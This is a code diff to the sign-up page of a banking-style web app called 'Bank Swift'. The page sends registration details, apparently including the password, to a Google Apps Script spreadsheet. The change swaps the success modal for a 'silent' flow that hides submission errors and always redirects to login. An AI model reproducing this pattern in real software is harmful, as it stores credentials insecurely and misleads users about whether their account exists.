@@ -9,21 +9,6 @@
   <link rel="shortcut icon" href="bank-swift.png" type="image/png" />
   <link rel="stylesheet" href="ui.css" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-  <style>
-    /* Page-specific: success modal (shared auth styling comes from ui.css) */
-    #successModal{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(15,23,42,.65);backdrop-filter:blur(6px);padding:1.5rem;z-index:500;opacity:0;pointer-events:none;transition:opacity .3s ease;}
-    #successModal.show{opacity:1;pointer-events:auto;}
-    #successModal .modal-shell{max-width:420px;width:100%;background:linear-gradient(135deg,rgba(255,255,255,.08),rgba(255,255,255,.04));border:1px solid rgba(255,255,255,.15);border-radius:24px;padding:2.25rem 2rem;position:relative;box-shadow:0 20px 50px -10px rgba(0,0,0,.6);text-align:center;}
-    .modal-icon{font-size:2.4rem;line-height:1;margin-bottom:.75rem;filter:drop-shadow(0 4px 10px rgba(16,185,129,.35));}
-    .modal-title{margin:0 0 .5rem;font-size:1.45rem;font-weight:700;letter-spacing:.5px;}
-    .modal-text{margin:0 0 1.5rem;font-size:.95rem;line-height:1.45;color:rgba(255,255,255,.8);}
-    .modal-actions{display:flex;gap:.75rem;flex-wrap:wrap;}
-    .modal-btn{flex:1 1 auto;display:inline-flex;align-items:center;justify-content:center;padding:.75rem 1rem;font-size:.85rem;font-weight:600;border-radius:10px;border:none;cursor:pointer;transition:.25s;letter-spacing:.25px;}
-    .modal-btn.primary{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;box-shadow:0 4px 15px -3px rgba(102,126,234,.45);}
-    .modal-btn.primary:hover{transform:translateY(-2px);box-shadow:0 8px 22px -6px rgba(102,126,234,.55);}
-    .modal-btn.ghost{background:rgba(255,255,255,.12);color:#fff;border:1px solid rgba(255,255,255,.18);}
-    .modal-btn.ghost:hover{background:rgba(255,255,255,.2);}
-  </style>
   <script src="common.js"></script>
 </head>
 <body>
@@ -85,19 +70,6 @@
   <div class="auth-alt">Already have an account? <a href="login.html">Sign in</a></div>
     </section>
   </main>
-
-  <!-- Success Modal -->
-  <div id="successModal" class="modal-overlay" aria-hidden="true" role="dialog" aria-modal="true">
-    <div class="modal-shell" role="document">
-      <div class="modal-icon" aria-hidden="true">✅</div>
-      <h2 class="modal-title">Account Created</h2>
-      <p class="modal-text">Your account was created successfully. You can now log in to start using Bank Swift.</p>
-      <div class="modal-actions">
-        <button id="modalLoginBtn" class="modal-btn primary">Log in to your account</button>
-        <button id="modalCloseBtn" class="modal-btn ghost" type="button">Close</button>
-      </div>
-    </div>
-  </div>
 
   <script>
     // Your Google Apps Script web app URL
@@ -174,102 +146,66 @@
           totalBalance: 0
         };
 
-        // Submit to Google Sheets via Apps Script
+        console.log('Submitting registration:', { ...newUser, password: '[HIDDEN]' });
+
+        // Submit to Google Sheets via Apps Script with timeout
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 15000); // 15 second timeout
+        
         const response = await fetch(SCRIPT_URL, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
-          body: JSON.stringify(newUser)
+          body: JSON.stringify(newUser),
+          mode: 'cors',
+          signal: controller.signal
         });
+        
+        clearTimeout(timeoutId);
+
+        console.log('Response status:', response.status, response.statusText);
+        
+        if (!response.ok) {
+          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+        }
 
         const result = await response.json();
+        console.log('Response data:', result);
         
         if (!result.success) {
-          showAlert(result.message || 'Could not save record to sheet. Please retry.');
-          btn.disabled = false;
-          btn.textContent = originalText;
-          return;
+          // Silent mode - log but don't show error to user
+          console.warn('Sheet submission failed:', result.message);
         }
-        window.__LAST_REG_ROW__ = newUser;
-        // Persist email + flash for login page prefill/message
-        try {
-          localStorage.setItem('bs-last-registered-email', email);
-          sessionStorage.setItem('bs-flash', 'Account created successfully. You can now sign in.');
-        } catch {}
-        // Show success modal
-        openSuccessModal();
-        btn.disabled = true;
-        btn.textContent = 'Account Created';
+        
+        // Continue to redirect regardless of API response
 
       } catch (err) {
-        console.error('Registration error:', err);
-        if (err.name === 'TypeError' && err.message.includes('fetch')) {
-          showAlert('Network error. Please check your connection and try again.');
-        } else {
-          showAlert('Could not complete registration. Please try again.');
-        }
-        btn.disabled = false;
-        btn.textContent = originalText;
-      }
-    });
-
-    function openSuccessModal(){
-      const modal = document.getElementById('successModal');
-      if(!modal) return;
-      modal.classList.add('show');
-      modal.setAttribute('aria-hidden','false');
-      
-      const loginBtn = document.getElementById('modalLoginBtn');
-      const closeBtn = document.getElementById('modalCloseBtn');
-      
-      if(loginBtn){ 
-        loginBtn.textContent='Log in to your account'; 
-        loginBtn.addEventListener('click', ()=>{ 
-          window.location.href = 'login.html'; 
-        }); 
-        setTimeout(()=>loginBtn.focus(),40); 
+        console.error('Registration error (silent):', err);
+        // Silent submission - proceed to redirect regardless of errors
       }
       
-      if(closeBtn){ 
-        closeBtn.addEventListener('click', ()=>{ 
-          closeSuccessModal(); 
-        }); 
-      }
+      // Always redirect after 3 seconds, regardless of success/failure
+      window.__LAST_REG_ROW__ = {
+        formType: 'Registration',
+        date: new Date().toISOString(),
+        fullname: fullname,
+        email: email,
+        phone: phone
+      };
       
-      document.addEventListener('keydown', escHandler);
-      
-      // Show confirmation details
+      // Persist email + flash for login page prefill/message
       try {
-        if(window.__LAST_REG_ROW__){
-          const row = window.__LAST_REG_ROW__;
-          const shell = modal.querySelector('.modal-shell');
-          if(shell && !shell.querySelector('.modal-verification')){
-            const div = document.createElement('div');
-            div.className='modal-verification';
-            div.style.cssText='margin-top:1rem;padding:.75rem .85rem;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);border-radius:14px;font-size:.65rem;line-height:1.35;word-break:break-word;text-align:left;';
-            div.innerHTML = `<strong style="font-size:.7rem;letter-spacing:.5px;">CONFIRMED REGISTRATION</strong><br>`+
-              `Email: <span style="color:#10b981">${row.email||''}</span><br>`+
-              `Name: ${(row.fullname||row.name||'').replace(/</g,'&lt;')}`;
-            shell.appendChild(div);
-          }
-        }
+        localStorage.setItem('bs-last-registered-email', email);
+        sessionStorage.setItem('bs-flash', 'Registration submitted. Please sign in with your credentials.');
       } catch {}
-    }
-
-    function escHandler(e){ 
-      if(e.key==='Escape'){ 
-        closeSuccessModal(); 
-      } 
-    }
-
-    function closeSuccessModal(){
-      const modal = document.getElementById('successModal');
-      if(!modal) return;
-      modal.classList.remove('show');
-      modal.setAttribute('aria-hidden','true');
-      document.removeEventListener('keydown', escHandler);
-    }
+      
+      btn.textContent = 'Redirecting to login...';
+      
+      setTimeout(() => {
+        window.location.href = 'login.html';
+      }, 3000);
+    });
 
     // Password visibility toggle
     (function(){ 
